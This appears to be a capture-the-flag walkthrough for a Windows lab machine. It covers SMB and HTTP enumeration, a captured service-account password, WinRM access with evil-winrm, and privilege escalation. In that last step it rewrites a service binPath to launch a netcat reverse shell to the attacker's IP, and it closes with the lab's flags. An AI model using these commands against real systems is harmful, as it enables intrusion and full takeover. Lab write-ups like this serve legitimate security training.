
**Key Concepts:** Windows Remote Management (WinRM), SMB (Server Message Block), Enumeration, Printer Admin Panel, Privilege Escalation, Server Operators Group.

**Key Commands:** winrm, crackmapexec, smbmap, evil-winrm, whoami, net user, sc.exe.

---

**Step 1: Identifying the Target**
- Port 5985 (WinRM) is open for remote Windows administration.
- Tools like evil-winrm can be used with valid credentials.
- Several open ports, including 445 (SMB).

**Step 2: Enumerating the Machine**
```bash
crackmapexec smb 10.10.11.108
```

**Step 3: Listing Shared Resources**
```bash
smbmap -H 10.10.11.108 -u 'null'
```

**Step 4: Focusing on HTTP Enumeration**
```bash
cat lognmap | grep http
```

**Step 5: Identifying Running Services**
```bash
whatweb http://10.10.11.108
```

- It reveals an IIS and a Printer Admin Panel.

**Step 6: Exploring the Printer Admin Panel**
- Upon checking the website, it's a Printer Admin Panel application.
- In the settings section, a connection to port 389 with a username and password is discovered.
- Set up a listener on your machine and make the service on the target connect to your machine to capture the user's password.

**Step 7: Using Credentials with crackmapexec**
```bash
crackmapexec smb 10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
```

- If crackmapexec responds with a "+", the credentials are valid.

**Step 8: Accessing Remote Windows Management (WinRM)**
- Since port 5985 (WinRM) is active and valid credentials are available, attempt to connect to the WinRM service using crackmapexec.
- If the response is "Pwn3d!", you have access to the machine.

```bash
crackmapexec winrm 10.10.11.108 -u 'svc-printer' -p 'password'
```

**Step 9: Gaining Access with evil-winrm**
- Now that access is confirmed, use the evil-winrm tool to connect to the victim machine.

```bash
evil-winrm -i 10.10.11.108 -u 'svc-printer' -p 'password'
```

**Step 10: Privilege Escalation**
- To escalate privileges, check the user's privileges and group membership.

```bash
whoami /priv
net user svc-printer
```

- The user is in the "server operators" group.

**Explanation of "server operators" group:** This group allows users to run and stop services, which can be exploited for privilege escalation.

**Step 11: Creating a Custom Service**
- Upload the netcat executable to the victim machine.

```bash
upload /home/klinux/Documents/htb/windows/Return/nc64.exe
```

- Create a custom service.

```bash
sc.exe create reverse binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd 10.10.14.8 1234"
```

- If creating the service fails, try manipulating the binPath of an existing service.

```bash
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc64.exe -e cmd 10.10.14.8 1234"
```

**Step 12: Gaining Access as SYSTEM**
- Start a listener on your machine on port 1234.
- Stop and then start the manipulated service (VMTools) as the user is in the "server operators" group.

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

- Gain access as 'nt authority\system'.

**Step 13: Obtaining Root Flag**
- With SYSTEM privileges, obtain the root flag and conclude the machine.

This tutorial provides a detailed step-by-step guide for remote Windows administration and privilege escalation, making it easier to follow and reference key concepts and commands.

User flag 092657ecfad11788d81fbbbd197f897c
Root flag 98eb8eba4af8f70f7ce8837ed8c3c378